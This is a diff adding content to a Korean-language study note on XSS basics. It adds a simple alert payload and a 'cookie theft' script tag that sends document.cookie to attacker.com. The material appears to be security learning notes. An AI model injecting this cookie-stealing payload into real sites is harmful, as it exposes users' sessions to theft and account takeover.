@@ -9,3 +9,15 @@ description: "XSS 기초 개념 정리"
 # XSS 기초
 
 XSS(Cross-Site Scripting) 기초 내용 작성 예정
+
+## 기본 페이로드
+
+```javascript
+<script>alert('XSS')</script>
+```
+
+## 쿠키 탈취
+
+```javascript
+<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
+```
